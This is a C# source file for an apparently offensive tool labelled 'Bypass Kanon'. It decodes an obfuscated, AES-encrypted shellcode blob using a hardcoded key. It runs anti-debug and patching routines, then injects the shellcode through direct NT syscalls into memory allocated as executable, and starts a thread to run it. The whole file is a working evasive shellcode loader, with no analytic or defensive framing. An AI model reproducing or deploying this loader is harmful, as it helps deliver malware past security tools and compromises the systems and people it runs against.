using System;
using System.Diagnostics;
using static KanonSys.Win32;
using static KanonSys.Syscall;
using System.Security.Cryptography;
using System.Text;

namespace KanonSys
{

	
	class Program {

		static void Main(string[] args) {

			Console.WriteLine("Bypass Kanon");

			Process npProc = Process.GetCurrentProcess();

			Patch.Patch.StartPatchBuffer();
			Patch.AntiDebug.firsTech();
			Patch.AntiDebug.secondTech();
			var sc = REGRESARUT8("QjNmazNZaFBPdHFSRlNzcms4RlI0eGQjIyMjK2NnMWpxMVhWL0JUZytldUJBenM2RlRYTWVpSndHVjFEUjJnUTlncUwwK3pZVytCN1E1bDR2b0JpQ0xQUWkwOW9iZURqRHU3cklCV0xSTTY1NkMwenlGRlZma0MvdVVkUE44eGhTdFlhMjR1IyMjI3N0MnhndUhUWXNPQzV4TExOWlNqcDFvT1F4ZU1oUHpsY3RLWkx4cWRGdEZ1Y2ZxWm1sNEJ2UWUrNzd5VVEyVmVoQjJ0b0J5WDd1RmJ3bjdzIyMjI2ltSmEvVHFhc0J6TnRrWE53MWxMN2c0YjFVT2hvVXVqNDM5d05hajZtOGNhME41c0JKMFcxUFU4UFdQZGF4IyMjIzFxanpWWlI5dXN4WHlDTmpyMmhKM2lYSSMjIyNJU3orQlhuQWNocWx4WXg5Q05vaThKdHlRdGxwTHdyZmJUSDJlbjdqa1NDWXpTOGJ0ZVFtOThwTlFucGk4cGZhRkZGRm8xZkovSGY4NXJzWDhoZjdXNWRXSVVTYzBLK0JKWDRMd0hyTCMjIyNDY0dUK1RVMHMrYkJ3IyMjIzBNWW1raFBBUFl1L3NrNVZMbHJQVnhKK0NOKyMjIyNiM05Kc3FPc2lSdUJKelUwZmVGVlpoNDFrM1Q1VlZJZUtRQUZ1NWU3VTRlZkZvSnVPYVA1aGdidTBtOGpDTXJTUktyTUQjIyMjZXBJamVSYVorK1dzS0NpeHZXVmovSzF5UGtvY3dCbU4ydldiVVdjb1VQR2M4V2hTZzE1YS8zdlR1T2NyZHlrNSMjIyMrNFlHSitTalJydU9xWDk0VlVKZUtlbUtUUCMjIyNMNUlnQWlleVhQM1RXIyMjIzBwOGk5djBlODNvaUwzIyMjI2haTW5sS1g0cENaZjJzamtPVzQ5NUdIa2pUckRiNGUzYlpCb2MzRkRER0FlWjZvK3Y2ZXcjIyMjNkxqZG5jWiMjIyNUWWVaZ3hIKzRNb1FjZjdpb0dpY0xKZmtUZ0NVMG1MNmdmMU4rM0pZcFBISEFGdXQwZW9hZGFTMEo0S3lRcmpDYXA0b1VwUVhJb0RCZ1BqRHU2MENkNzVTMXNGME0jIyMjOS9rRGhUQ2lVTmZ1WDFJTERDVC9lRjlLQ0hoZE9IakZ6V2RQWG0ydzJlcldnZmtRampBVitteWE0MVhoMUNva09XVk56czhrQUx5VFVxcm10dTNvaDJWdi9Na2p6MVV1OWs2WEJlbk4rU1VoWXo1clVvWC9GZ1V5eDhMSDJ3ZGZkMWRwbW9sSVhLcUtnYldPcWcwL1IzeHVHYlhBbnNwSE1tRzJ0WDMyQnI1UjBrWVRJeWNrR2ViWnojIyMjVFJvTXlSaWFHVXVJNGpOVjhjakQrWiMjIyNTYk90cmxkQndHZDRDc1hNdWpJaURYMzN2R1ZTWGk3QUlKV0lkTWJJZjcjIyMjSThOSHlQT1kyUFRIUUNDelRLYXdSQWdOQkpyT0d1R2ZsV0ZVbSMjIyNmaVU4bjhSQjZxd1JLblhWIyMjI0NvUm9GNGw2RmVmWEF4Z3VoRjEvL0RZZFl0Nm8yL1ZMUmxjSm1kVWozQnJ6eWQrM0tNMi9nNWR0NWEjIyMjanJZZm43azVsRktEdElGUENMNkoyNE5hRDB5ZWQvbUhTYkNCMmdSN2FLL0c1SmJrZVIzRHN0SCMjIyNDaDF2dW9nc29SUG1PcFdxeUsycndIKzZPREwwTEpzZG02RHZNSmN5M1NoUmtsbXZYMk02UmtEYXp0TDU0b2ojIyMjaDh5UEhlSnVwakRwK2hlb2taU3lpNGdNc0QyTksyYTFuNjhMT3VrOExtS2FIbVFIOVo0VjZDMXBMWTlpK24jIyMjZUZ3dUZObWtVMGxHQm9Zb1Q4MzJmQnRhMlhZcEZDTE9LWFh2MFhkbm12a2FPbHhyTldsNkhoUEdDY0JNRHp6MlRUK09uIyMjI0xGMkhqbm16bHhiUTJWbmZPMXpDIyMjI0J0ajNTTDQwRjZjbk9hOTI1TWZtQjk4YlFRWlN4U0dmYkdReHpDQzcxek9MVUZnYlZmTzNaTSMjIyNldHRUOHBwZndaQW83IyMjIzYxaWtudGpEZ0xSWkF6UVNnUi9DSCMjIyM5MkdsckQzemJBcGhiRlhvdzBWZzBkUjAwUkJhSGMwOTFVcXY0NWtqQzl2UjJkc0tjakdNSWJ0UVdoTFA5MWZVc1M1b3RqYXNEdw==");
			sc = sc.Replace("####", "E");
			var key = ("AGB75HV433857PX17FD8FG58H8H885A7DGFI2Z");
			byte[] buf = Convert.FromBase64String(AES_Decrypt(sc, key));

			IntPtr addr = IntPtr.Zero;
			IntPtr hProcess = IntPtr.Zero;
			IntPtr threadHandle = new IntPtr();
			UIntPtr allocationSize = new UIntPtr(Convert.ToUInt32(buf.Length));
			UInt32 outSize = 0;

			CLIENT_ID ci = new CLIENT_ID {
				UniqueProcess = (IntPtr)npProc.Id
			};
			OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

			NtOpenProcess(ref hProcess, 0x001F0FFF, ref oa, ref ci);
			NtAllocateVirtualMemory(hProcess, ref addr, 0, ref allocationSize, 0x00002000 | 0x00001000, 0x40);
			NtWriteVirtualMemory(hProcess, addr, buf, (uint)buf.Length, ref outSize);
			NtCreateThreadEx(ref threadHandle, 0x0000FFFF | 0x001F0000, IntPtr.Zero, hProcess, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

			Console.WriteLine("HACK");
			Console.ReadLine();

		}
		public static string REGRESARUT8(string base64EncodedData)
		{
			var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
			return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
		}
		public static string AES_Decrypt(string TexT, string iKey)
		{
			AesManaged AES_256 = new AesManaged();
			MD5CryptoServiceProvider HashAES = new MD5CryptoServiceProvider();
			string Decrypt = "";
			byte[] Hash = HashAES.ComputeHash(ASCIIEncoding.ASCII.GetBytes(iKey));
			AES_256.Key = Hash;
			AES_256.Mode = CipherMode.ECB;
			byte[] Buffer1 = Convert.FromBase64String(TexT);
			Decrypt = System.Text.ASCIIEncoding.ASCII.GetString(AES_256.CreateDecryptor().TransformFinalBlock(Buffer1, 0, Buffer1.Length));
			return Decrypt;
		}
	}
}
